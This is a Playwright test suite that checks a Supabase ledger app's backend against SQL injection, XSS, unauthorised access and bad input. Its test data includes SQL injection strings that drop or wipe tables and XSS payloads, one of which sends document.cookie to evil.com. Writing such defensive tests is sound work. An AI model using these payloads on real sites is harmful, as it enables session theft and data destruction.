import { test, expect } from '@playwright/test';
import { createClient, SupabaseClient } from '@supabase/supabase-js';
import type { Database } from '../../src/lib/database.types';

/**
 * Backend Security Tests for Global Ledger v8 MVP
 *
 * These tests verify:
 * - SQL Injection prevention
 * - XSS prevention (input sanitization)
 * - CSRF protection (token validation)
 * - Rate limiting behavior
 * - Authentication security
 * - Authorization enforcement
 * - Input validation security
 *
 * Prerequisites:
 * - Set up TEST_USER_EMAIL and TEST_USER_PASSWORD in .env.test
 * - Supabase project with RLS enabled
 */

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!;
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!;
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY!;

// Test user credentials
const TEST_USER_EMAIL = process.env.TEST_USER_EMAIL || 'test@example.com';
const TEST_USER_PASSWORD = process.env.TEST_USER_PASSWORD || 'testpassword123';

let supabase: SupabaseClient<Database>;
let adminClient: SupabaseClient<Database>;
let testUserId: string | null = null;
let testCustomerId: string | null = null;

// Cleanup tracking
const createdCustomerIds: string[] = [];
const createdTransactionIds: string[] = [];

test.describe('Backend Security Tests', () => {
  test.beforeAll(async () => {
    // Create anonymous client
    supabase = createClient<Database>(supabaseUrl, supabaseAnonKey);

    // Create admin client (bypasses RLS for cleanup)
    if (supabaseServiceKey) {
      adminClient = createClient<Database>(supabaseUrl, supabaseServiceKey, {
        auth: {
          autoRefreshToken: false,
          persistSession: false,
        },
      });
    }

    // Sign in as test user
    const { data, error } = await supabase.auth.signInWithPassword({
      email: TEST_USER_EMAIL,
      password: TEST_USER_PASSWORD,
    });

    if (!error && data.user) {
      testUserId = data.user.id;

      // Create a test customer for security tests
      const { data: customer } = await supabase
        .from('customers')
        .insert({
          user_id: testUserId,
          name: 'Security Test Customer',
          phone: '+1999999999',
        })
        .select()
        .single();

      if (customer) {
        testCustomerId = customer.id;
        createdCustomerIds.push(customer.id);
      }
    }
  });

  test.afterAll(async () => {
    // Cleanup
    if (adminClient && createdTransactionIds.length > 0) {
      await adminClient
        .from('transactions')
        .delete()
        .in('id', createdTransactionIds);
    }

    if (adminClient && createdCustomerIds.length > 0) {
      await adminClient
        .from('customers')
        .delete()
        .in('id', createdCustomerIds);
    }

    await supabase.auth.signOut();
  });

  test.describe('SQL Injection Prevention', () => {
    test('should safely handle SQL injection attempt in customer name', async () => {
      test.skip(!testUserId, 'No test user authenticated');

      const sqlInjectionPayload = "'; DROP TABLE customers; --";

      const { data, error } = await supabase
        .from('customers')
        .insert({
          user_id: testUserId!,
          name: sqlInjectionPayload,
          phone: '+1111111111',
        })
        .select()
        .single();

      // The payload should be stored as a literal string, not executed
      expect(error).toBeNull();
      expect(data).toBeDefined();
      expect(data!.name).toBe(sqlInjectionPayload);

      if (data) {
        createdCustomerIds.push(data.id);
      }

      // Verify customers table still exists
      const { data: customers, error: selectError } = await supabase
        .from('customers')
        .select('id')
        .limit(1);

      expect(selectError).toBeNull();
      expect(customers).toBeDefined();
    });

    test('should safely handle SQL injection in search queries', async () => {
      test.skip(!testUserId, 'No test user authenticated');

      const injectionPayloads = [
        "' OR '1'='1",
        "'; SELECT * FROM user_profiles; --",
        "' UNION SELECT * FROM customers --",
        "1; DELETE FROM transactions WHERE 1=1; --",
      ];

      for (const payload of injectionPayloads) {
        const { data, error } = await supabase
          .from('customers')
          .select('*')
          .eq('user_id', testUserId)
          .ilike('name', `%${payload}%`);

        // Query should execute safely without error
        expect(error).toBeNull();
        expect(data).toBeDefined();
        // Should return empty or normal results, not all records
        expect(Array.isArray(data)).toBe(true);
      }
    });

    test('should safely handle SQL injection in transaction description', async () => {
      test.skip(!testUserId || !testCustomerId, 'No test user or customer');

      const injectionPayload =
        "'); UPDATE customers SET is_deleted = true; --";

      const { data, error } = await supabase
        .from('transactions')
        .insert({
          user_id: testUserId!,
          customer_id: testCustomerId!,
          type: 'debt',
          amount: 100,
          description: injectionPayload,
        })
        .select()
        .single();

      expect(error).toBeNull();
      expect(data).toBeDefined();
      expect(data!.description).toBe(injectionPayload);

      if (data) {
        createdTransactionIds.push(data.id);
      }

      // Verify customer was not affected
      const { data: customer } = await supabase
        .from('customers')
        .select('is_deleted')
        .eq('id', testCustomerId)
        .single();

      expect(customer?.is_deleted).toBeFalsy();
    });

    test('should safely handle numeric SQL injection', async () => {
      test.skip(!testUserId || !testCustomerId, 'No test user or customer');

      // These should be rejected by type checking or stored as literal strings
      const numericInjectionPayloads = [
        '1 OR 1=1',
        '1; DROP TABLE transactions',
        '1 UNION SELECT * FROM user_profiles',
      ];

      for (const payload of numericInjectionPayloads) {
        // Try to inject via amount field (should fail type validation)
        const { data, error } = await supabase
          .from('transactions')
          .insert({
            user_id: testUserId!,
            customer_id: testCustomerId!,
            type: 'debt',
            amount: payload as any, // Force type to bypass TS
          })
          .select()
          .single();

        // Should error because amount expects numeric
        expect(error || data === null).toBeTruthy();
      }
    });
  });

  test.describe('XSS Prevention (Input Sanitization)', () => {
    test('should safely store XSS payload as literal text in customer name', async () => {
      test.skip(!testUserId, 'No test user authenticated');

      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<svg onload=alert("XSS")>',
        '"><script>document.location="http://evil.com"</script>',
      ];

      for (const payload of xssPayloads) {
        const { data, error } = await supabase
          .from('customers')
          .insert({
            user_id: testUserId!,
            name: payload,
            phone: '+1222222222',
          })
          .select()
          .single();

        // Payload should be stored as literal text
        expect(error).toBeNull();
        expect(data).toBeDefined();
        expect(data!.name).toBe(payload);

        if (data) {
          createdCustomerIds.push(data.id);
        }
      }
    });

    test('should safely store XSS payload in transaction description', async () => {
      test.skip(!testUserId || !testCustomerId, 'No test user or customer');

      const xssPayload =
        '<script>fetch("https://evil.com/steal?cookie=" + document.cookie)</script>';

      const { data, error } = await supabase
        .from('transactions')
        .insert({
          user_id: testUserId!,
          customer_id: testCustomerId!,
          type: 'debt',
          amount: 50,
          description: xssPayload,
        })
        .select()
        .single();

      expect(error).toBeNull();
      expect(data).toBeDefined();
      expect(data!.description).toBe(xssPayload);

      if (data) {
        createdTransactionIds.push(data.id);
      }
    });

    test('should handle HTML entities in input', async () => {
      test.skip(!testUserId, 'No test user authenticated');

      const htmlEntities = '&lt;script&gt;alert(1)&lt;/script&gt;';

      const { data, error } = await supabase
        .from('customers')
        .insert({
          user_id: testUserId!,
          name: htmlEntities,
          phone: '+1333333333',
        })
        .select()
        .single();

      expect(error).toBeNull();
      expect(data).toBeDefined();
      expect(data!.name).toBe(htmlEntities);

      if (data) {
        createdCustomerIds.push(data.id);
      }
    });

    test('should handle unicode that could be used for XSS', async () => {
      test.skip(!testUserId, 'No test user authenticated');

      const unicodePayloads = [
        '\u003cscript\u003ealert(1)\u003c/script\u003e', // Unicode escaped
        '%3Cscript%3Ealert(1)%3C/script%3E', // URL encoded
        '\uff1cscript\uff1e', // Full-width characters
      ];

      for (const payload of unicodePayloads) {
        const { data, error } = await supabase
          .from('customers')
          .insert({
            user_id: testUserId!,
            name: payload,
            phone: '+1444444444',
          })
          .select()
          .single();

        // Should store as-is (frontend handles encoding)
        expect(error).toBeNull();
        expect(data).toBeDefined();

        if (data) {
          createdCustomerIds.push(data.id);
        }
      }
    });
  });

  test.describe('Authentication Security', () => {
    test('should reject unauthenticated access to protected data', async () => {
      // Sign out first
      await supabase.auth.signOut();

      const { data, error } = await supabase
        .from('customers')
        .select('*')
        .limit(1);

      // Should return empty (RLS blocks) or error
      expect(data?.length === 0 || error).toBeTruthy();

      // Re-authenticate
      await supabase.auth.signInWithPassword({
        email: TEST_USER_EMAIL,
        password: TEST_USER_PASSWORD,
      });
    });

    test('should reject unauthenticated data creation', async () => {
      await supabase.auth.signOut();

      const { data, error } = await supabase
        .from('customers')
        .insert({
          user_id: '00000000-0000-0000-0000-000000000000',
          name: 'Should Not Create',
        })
        .select()
        .single();

      expect(error).toBeDefined();
      expect(data).toBeNull();

      await supabase.auth.signInWithPassword({
        email: TEST_USER_EMAIL,
        password: TEST_USER_PASSWORD,
      });
    });

    test('should reject unauthenticated data updates', async () => {
      test.skip(!testCustomerId, 'No test customer');

      await supabase.auth.signOut();

      const { data, error } = await supabase
        .from('customers')
        .update({ name: 'Should Not Update' })
        .eq('id', testCustomerId!)
        .select()
        .single();

      expect(error || data === null).toBeTruthy();

      await supabase.auth.signInWithPassword({
        email: TEST_USER_EMAIL,
        password: TEST_USER_PASSWORD,
      });
    });

    test('should reject unauthenticated data deletion', async () => {
      test.skip(!testCustomerId, 'No test customer');

      await supabase.auth.signOut();

      const { error } = await supabase
        .from('customers')
        .delete()
        .eq('id', testCustomerId!);

      // Should be blocked by RLS
      expect(error).toBeDefined();

      await supabase.auth.signInWithPassword({
        email: TEST_USER_EMAIL,
        password: TEST_USER_PASSWORD,
      });
    });

    test('should not allow accessing other users data', async () => {
      test.skip(!testUserId, 'No test user authenticated');

      // Try to access data belonging to a different user
      const fakeUserId = '00000000-0000-0000-0000-000000000000';

      const { data, error } = await supabase
        .from('customers')
        .select('*')
        .eq('user_id', fakeUserId);

      expect(error).toBeNull();
      // Should return empty array (no access to other user's data)
      expect(data?.length).toBe(0);
    });
  });

  test.describe('Authorization Enforcement', () => {
    test('should enforce RLS on customer reads', async () => {
      test.skip(!testUserId, 'No test user authenticated');

      const { data, error } = await supabase
        .from('customers')
        .select('*');

      expect(error).toBeNull();
      expect(data).toBeDefined();

      // All returned customers should belong to the current user
      data!.forEach((customer) => {
        expect(customer.user_id).toBe(testUserId);
      });
    });

    test('should enforce RLS on transaction reads', async () => {
      test.skip(!testUserId, 'No test user authenticated');

      const { data, error } = await supabase
        .from('transactions')
        .select('*');

      expect(error).toBeNull();
      expect(data).toBeDefined();

      // All returned transactions should belong to the current user
      data!.forEach((transaction) => {
        expect(transaction.user_id).toBe(testUserId);
      });
    });

    test('should enforce RLS on user_profile reads', async () => {
      test.skip(!testUserId, 'No test user authenticated');

      const { data, error } = await supabase
        .from('user_profiles')
        .select('*');

      expect(error).toBeNull();
      expect(data).toBeDefined();

      // Should only see own profile
      expect(data!.length).toBe(1);
      expect(data![0].id).toBe(testUserId);
    });

    test('should prevent updating other users customers', async () => {
      const randomUuid = '00000000-0000-0000-0000-000000000001';

      const { data, error } = await supabase
        .from('customers')
        .update({ name: 'Hacked!' })
        .eq('id', randomUuid)
        .select()
        .single();

      // Should either error or return null (no rows updated)
      expect(error || data === null).toBeTruthy();
    });

    test('should prevent deleting other users customers', async () => {
      const randomUuid = '00000000-0000-0000-0000-000000000002';

      const { data, error } = await supabase
        .from('customers')
        .delete()
        .eq('id', randomUuid)
        .select()
        .single();

      // Should either error or return null (no rows deleted)
      expect(error || data === null).toBeTruthy();
    });
  });

  test.describe('Input Validation Security', () => {
    test('should reject empty required fields', async () => {
      test.skip(!testUserId, 'No test user authenticated');

      // Empty name should be rejected
      const { data, error } = await supabase
        .from('customers')
        .insert({
          user_id: testUserId!,
          name: '',
          phone: '+1555555555',
        })
        .select()
        .single();

      // Empty string for required field should fail
      expect(error || data === null).toBeTruthy();
    });

    test('should reject invalid transaction types', async () => {
      test.skip(!testUserId || !testCustomerId, 'No test user or customer');

      const { data, error } = await supabase
        .from('transactions')
        .insert({
          user_id: testUserId!,
          customer_id: testCustomerId!,
          type: 'invalid_type' as any,
          amount: 100,
        })
        .select()
        .single();

      expect(error).toBeDefined();
      expect(data).toBeNull();
    });

    test('should reject zero or negative amounts', async () => {
      test.skip(!testUserId || !testCustomerId, 'No test user or customer');

      // Zero amount
      const { data: zeroData, error: zeroError } = await supabase
        .from('transactions')
        .insert({
          user_id: testUserId!,
          customer_id: testCustomerId!,
          type: 'debt',
          amount: 0,
        })
        .select()
        .single();

      expect(zeroError).toBeDefined();
      expect(zeroData).toBeNull();

      // Negative amount
      const { data: negData, error: negError } = await supabase
        .from('transactions')
        .insert({
          user_id: testUserId!,
          customer_id: testCustomerId!,
          type: 'debt',
          amount: -100,
        })
        .select()
        .single();

      expect(negError).toBeDefined();
      expect(negData).toBeNull();
    });

    test('should reject invalid foreign keys', async () => {
      test.skip(!testUserId, 'No test user authenticated');

      const fakeCustomerId = '00000000-0000-0000-0000-000000000000';

      const { data, error } = await supabase
        .from('transactions')
        .insert({
          user_id: testUserId!,
          customer_id: fakeCustomerId,
          type: 'debt',
          amount: 100,
        })
        .select()
        .single();

      // Should fail due to FK constraint
      expect(error).toBeDefined();
      expect(data).toBeNull();
    });

    test('should handle extremely long input strings', async () => {
      test.skip(!testUserId, 'No test user authenticated');

      const veryLongName = 'A'.repeat(10000);

      const { data, error } = await supabase
        .from('customers')
        .insert({
          user_id: testUserId!,
          name: veryLongName,
          phone: '+1666666666',
        })
        .select()
        .single();

      // Should either truncate, accept, or reject based on schema
      // Not crash or cause security issues
      if (!error && data) {
        createdCustomerIds.push(data.id);
        expect(data.name).toBeDefined();
      }
    });

    test('should handle special characters in all fields', async () => {
      test.skip(!testUserId, 'No test user authenticated');

      const specialChars = '!@#$%^&*()_+-=[]{}|;\':",./<>?`~';

      const { data, error } = await supabase
        .from('customers')
        .insert({
          user_id: testUserId!,
          name: specialChars,
          phone: specialChars,
          address: specialChars,
          notes: specialChars,
        })
        .select()
        .single();

      // Should handle special characters safely
      expect(error).toBeNull();
      expect(data).toBeDefined();

      if (data) {
        createdCustomerIds.push(data.id);
      }
    });
  });

  test.describe('Data Exposure Prevention', () => {
    test('should not expose other users in queries', async () => {
      test.skip(!testUserId, 'No test user authenticated');

      // Query all customers - should only return current user's
      const { data, error } = await supabase
        .from('customers')
        .select('user_id')
        .limit(100);

      expect(error).toBeNull();
      expect(data).toBeDefined();

      // All results should be for current user only
      const uniqueUserIds = new Set(data!.map((c) => c.user_id));
      expect(uniqueUserIds.size).toBe(1);
      expect(uniqueUserIds.has(testUserId!)).toBe(true);
    });

    test('should not expose internal timestamps inappropriately', async () => {
      test.skip(!testCustomerId, 'No test customer');

      const { data, error } = await supabase
        .from('customers')
        .select('created_at, updated_at')
        .eq('id', testCustomerId!)
        .single();

      // Timestamps should exist but be properly formatted
      expect(error).toBeNull();
      expect(data).toBeDefined();
      expect(data!.created_at).toBeDefined();
      // Should be valid ISO timestamp
      expect(() => new Date(data!.created_at!).toISOString()).not.toThrow();
    });

    test('should not leak data in error messages', async () => {
      test.skip(!testUserId, 'No test user authenticated');

      const { data, error } = await supabase
        .from('customers')
        .select('*')
        .eq('id', 'invalid-uuid-format')
        .single();

      // Error should not contain sensitive information
      expect(data).toBeNull();
      if (error) {
        // Error message should be generic, not expose table structure
        const errorMsg = error.message.toLowerCase();
        // Should not contain SQL details
        expect(errorMsg).not.toContain('select');
        expect(errorMsg).not.toContain('from');
        expect(errorMsg).not.toContain('where');
      }
    });
  });

  test.describe('Concurrent Request Security', () => {
    test('should handle concurrent customer creation safely', async () => {
      test.skip(!testUserId, 'No test user authenticated');

      const concurrentRequests = 5;
      const promises = Array(concurrentRequests)
        .fill(null)
        .map((_, i) =>
          supabase
            .from('customers')
            .insert({
              user_id: testUserId!,
              name: `Concurrent Test ${i}`,
              phone: `+1777777777${i}`,
            })
            .select()
            .single()
        );

      const results = await Promise.all(promises);

      // All should succeed or fail gracefully
      results.forEach((result, i) => {
        if (result.data) {
          createdCustomerIds.push(result.data.id);
          expect(result.error).toBeNull();
        }
      });
    });

    test('should handle concurrent transaction creation safely', async () => {
      test.skip(!testUserId || !testCustomerId, 'No test user or customer');

      const concurrentRequests = 5;
      const promises = Array(concurrentRequests)
        .fill(null)
        .map((_, i) =>
          supabase
            .from('transactions')
            .insert({
              user_id: testUserId!,
              customer_id: testCustomerId!,
              type: i % 2 === 0 ? 'debt' : 'payment',
              amount: 10 * (i + 1),
            })
            .select()
            .single()
        );

      const results = await Promise.all(promises);

      results.forEach((result) => {
        if (result.data) {
          createdTransactionIds.push(result.data.id);
          expect(result.error).toBeNull();
        }
      });
    });
  });
});
